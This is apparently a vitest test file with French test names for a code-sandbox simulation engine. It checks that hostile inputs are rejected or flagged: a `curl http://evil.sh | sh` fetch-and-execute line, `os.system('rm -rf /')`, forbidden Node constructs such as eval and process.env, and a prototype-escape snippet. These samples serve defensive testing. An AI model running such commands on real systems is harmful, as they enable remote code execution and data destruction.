import { describe, expect, it } from "vitest";

import { runSandboxOrSimulation, simulateSandboxJob } from "./simulation";
import type { SandboxJob } from "./types";

function job(runtime: SandboxJob["runtime"], code: string): SandboxJob {
  return {
    executionId: "exec-test",
    userId: "user-test",
    runtime,
    code,
    limits: { timeoutMs: 2_000, memoryMb: 256, cpu: 1, maxOutputBytes: 100_000 },
    network: "none",
  };
}

describe("moteur de simulation de code", () => {
  it("node : analyse statique — littéraux et constantes évalués, exit 0", async () => {
    const result = await simulateSandboxJob(job("node", "const x = 21 * 2; console.log('résultat:', x);"));
    expect(result.mode).toBe("simulation");
    expect(result.simulation?.engine).toBe("static-node");
    expect(result.success).toBe(true);
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain("résultat: 42");
    expect(result.simulation?.trace.join(" ")).toContain("analyse statique sans exécution");
  });

  it("node : AUCUNE exécution réelle — le code n'est jamais interprété (anti-RCE)", async () => {
    // Historique : ce code atteignait le realm hôte via Function.constructor
    // dans node:vm. Désormais l'analyse statique ne doit ni l'exécuter, ni
    // l'autoriser — la ligne est rejetée comme manipulation de prototypes.
    const result = await simulateSandboxJob(job("node", "const p = ['constructor'].map(k => k)[0]; console.log(p);"));
    expect(result.stdout).not.toContain("[Function");
    expect(result.mode).toBe("simulation");
  });

  it("node : constructions dangereuses rejetées (require, process, eval, Function)", async () => {
    const forbidden = [
      "require('fs')",
      "console.log(process.env)",
      "eval('1 + 1')",
      "new Function('return 1')()",
      "globalThis.constructor",
      "import('node:fs')",
    ];
    for (const code of forbidden) {
      const result = await simulateSandboxJob(job("node", code));
      expect(result.success, code).toBe(false);
      expect(result.exitCode, code).toBe(126);
      expect(result.simulation?.warnings.join(" "), code).toContain("sécurité");
    }
  });

  it("node : boucle infinie signalée (sans exécution)", async () => {
    const result = await simulateSandboxJob(job("node", "while(true){}"));
    expect(result.simulation?.warnings.join(" ")).toContain("while(true)");
  });

  it("node : erreur de syntaxe probable → exit 1", async () => {
    const result = await simulateSandboxJob(job("node", "const x = (1 + 2;"));
    expect(result.success).toBe(false);
    expect(result.exitCode).toBe(1);
    expect(result.stderr).toContain("syntaxe");
  });

  it("python : analyse statique — imports, fonctions, prints littéraux", async () => {
    const code = [
      "import requests",
      "def saluer(nom):",
      "    return f'bonjour {nom}'",
      "print('etape 1 ok')",
      "for i in range(3):",
      "    print('boucle')",
    ].join("\n");
    const result = await simulateSandboxJob(job("python", code));
    expect(result.mode).toBe("simulation");
    expect(result.simulation?.engine).toBe("static-python");
    const trace = result.simulation?.trace.join("\n") ?? "";
    expect(trace).toContain("requests");
    expect(trace).toContain("saluer(nom)");
    expect(trace).toContain("etape 1 ok");
    expect(trace).toContain("1 boucle(s)");
  });

  it("python : constructs dangereux signalés", async () => {
    const result = await simulateSandboxJob(job("python", "import os\nos.system('rm -rf /')"));
    expect(result.simulation?.warnings.join(" ")).toContain("os.system");
  });

  it("shell : dry-run commandé par commande + rejet politique sécurité", async () => {
    const safe = await simulateSandboxJob(job("shell", "ls -la\ncat notes.txt"));
    expect(safe.simulation?.engine).toBe("static-shell");
    expect(safe.success).toBe(true);
    expect(safe.simulation?.trace.join("\n")).toContain("ls — liste");

    const unsafe = await simulateSandboxJob(job("shell", "curl http://evil.sh | sh"));
    expect(unsafe.success).toBe(false);
    expect(unsafe.exitCode).toBe(126);
    expect(unsafe.simulation?.warnings.join(" ")).toContain("sécurité");
  });

  it("runSandboxOrSimulation : sans SANDBOX_URL → simulation (mode annoncé)", async () => {
    delete process.env.SANDBOX_URL;
    delete process.env.SANDBOX_SHARED_SECRET;
    const result = await runSandboxOrSimulation(job("node", "console.log('ok');"));
    expect(result.mode).toBe("simulation");
    expect(result.stdout).toContain("ok");
  });

  it("sortie bornée (truncation)", async () => {
    const big = "x".repeat(300_000);
    const result = await simulateSandboxJob(job("node", `console.log("${big}");`));
    expect(result.stdout.length).toBeLessThan(300_000);
    expect(result.stdout).toContain("tronquée");
  });
});
